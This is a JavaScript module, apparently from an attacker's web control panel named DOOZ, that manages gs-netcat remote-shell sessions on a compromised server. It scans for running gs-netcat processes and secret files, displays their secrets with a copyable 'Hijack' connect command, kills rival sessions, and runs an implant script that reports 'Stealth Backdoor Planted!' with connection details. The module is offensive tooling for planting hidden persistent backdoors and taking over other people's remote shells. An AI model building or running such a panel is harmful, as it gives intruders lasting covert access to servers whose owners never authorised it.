// DOOZ GSSocket Module
const {$,api,openModal,closeModal}=window.DOOZ;

async function gsScan(){
    const list=$('gs-list');
    const alert=$('gs-alert');
    if(list)list.innerHTML='<div style="padding:20px;text-align:center;color:var(--dim)">Scanning...</div>';
    
    const r=await api('run',{path:'scripts/gscan.sh'});
    
    try{
        const d=JSON.parse(r.output||'{"gsockets":[]}');
        const items=d.gsockets||[];
        const procs=items.filter(g=>g.type==='process');
        const secrets=items.filter(g=>g.type==='secret_file');
        
        // Alert
        if(alert){
            if(procs.length){
                alert.innerHTML=`<div class="alert"><span class="alert-icon">🚨</span><div class="alert-text"><strong>${procs.length} Active GSockets!</strong></div><button class="btn btn-sm btn-red" onclick="gsKillAll()">Kill All</button></div>`;
            }else{
                alert.innerHTML=`<div class="alert success"><span class="alert-icon">✓</span><div class="alert-text">Clean - No active GSockets</div></div>`;
            }
        }
        
        // Build cards
        let h='';
        procs.forEach(g=>{
            h+=`<div class="gs-card hostile">
                <div class="gs-header"><span class="gs-badge hostile">PROCESS</span><span class="gs-pid">PID: ${g.pid}</span></div>
                <div class="gs-body">
                    <div class="gs-row"><span>User:</span><span>${g.user||'-'}</span></div>
                    <div class="gs-row"><span>Secret:</span><span class="gs-secret">${g.secret||'hidden'}</span></div>
                    ${g.secret?`<div class="gs-row"><span>Connect:</span><code onclick="navigator.clipboard.writeText(this.textContent)">gs-netcat -s ${g.secret} -i</code></div>`:''}
                </div>
                <div class="gs-actions"><button class="btn btn-sm btn-red" onclick="gsKill(${g.pid})">Kill</button></div>
            </div>`;
        });
        
        secrets.forEach(g=>{
            h+=`<div class="gs-card">
                <div class="gs-header"><span class="gs-badge">SECRET FILE</span></div>
                <div class="gs-body">
                    <div class="gs-row"><span>Path:</span><span style="font-size:10px">${g.path}</span></div>
                    <div class="gs-row"><span>Secret:</span><span class="gs-secret">${g.secret||'-'}</span></div>
                    <div class="gs-row"><span>Owner:</span><span>${g.owner||'-'}</span></div>
                    ${g.secret?`<div class="gs-row"><span>Hijack:</span><code onclick="navigator.clipboard.writeText(this.textContent)">gs-netcat -s ${g.secret} -i</code></div>`:''}
                </div>
            </div>`;
        });
        
        if(list)list.innerHTML=h||'<div style="padding:20px;text-align:center;color:var(--green)">✓ No GSockets found</div>';
    }catch(e){
        if(list)list.innerHTML=`<div style="padding:20px"><div style="color:var(--red);margin-bottom:10px">Error: ${e.message}</div><pre style="background:#000;padding:10px;border-radius:4px;font-size:10px;max-height:200px;overflow:auto">${r.output||'No output'}</pre></div>`;
    }
}

async function gsKill(pid){
    await api('exec',{cmd:'kill -9 '+pid});
    setTimeout(gsScan,500);
}

async function gsKillAll(){
    if(!confirm('Kill ALL gs-netcat/defunct?'))return;
    await api('exec',{cmd:"pkill -9 -f 'gs-netcat|defunct'"});
    setTimeout(gsScan,500);
}

async function gsPlant(){
    const secret=prompt('Secret (empty=random):');
    const result=$('gs-plant-result');
    
    if(result)result.innerHTML='<div style="text-align:center;padding:20px;color:var(--gold)">🔄 Planting...</div>';
    openModal('modal-gsplant');
    
    const r=await api('run',{path:'scripts/gs_implant.sh '+(secret||'')});
    
    try{
        const lines=(r.output||'').trim().split('\n');
        const d=JSON.parse(lines[lines.length-1]);
        
        if(d.status==='success'&&result){
            result.innerHTML=`
                <div class="gs-success-box">
                    <div style="font-size:24px;margin-bottom:10px">✅</div>
                    <h3 style="color:var(--green);margin-bottom:16px">Stealth Backdoor Planted!</h3>
                    <div class="gs-info-grid">
                        <div class="gs-info-row"><span>Secret:</span><span class="gs-secret-big">${d.secret}</span></div>
                        <div class="gs-info-row"><span>Binary:</span><span>${d.binary}</span></div>
                        <div class="gs-info-row"><span>Instances:</span><span>${d.instances}</span></div>
                        <div class="gs-info-row"><span>PIDs:</span><span>${d.pids||'-'}</span></div>
                    </div>
                    <div style="margin-top:16px;padding:12px;background:#000;border-radius:8px">
                        <div style="color:var(--dim);font-size:10px;margin-bottom:4px">CONNECT (click to copy)</div>
                        <code onclick="navigator.clipboard.writeText(this.textContent)" style="cursor:pointer">${d.connect}</code>
                    </div>
                    <div style="margin-top:12px;font-size:10px;color:var(--dim)">Features: ${(d.features||[]).join(', ')}</div>
                </div>`;
        }else throw new Error(d.message||'Unknown');
    }catch(e){
        if(result)result.innerHTML=`<div style="text-align:center;padding:20px"><div style="font-size:24px;margin-bottom:10px">❌</div><div style="color:var(--red)">Failed: ${e.message}</div><pre style="background:#000;padding:10px;margin-top:12px;font-size:10px;text-align:left;max-height:150px;overflow:auto">${r.output||''}</pre></div>`;
    }
    setTimeout(gsScan,1000);
}

window.load_gs=gsScan;
window.gsScan=gsScan;
window.gsKill=gsKill;
window.gsKillAll=gsKillAll;
window.gsPlant=gsPlant;
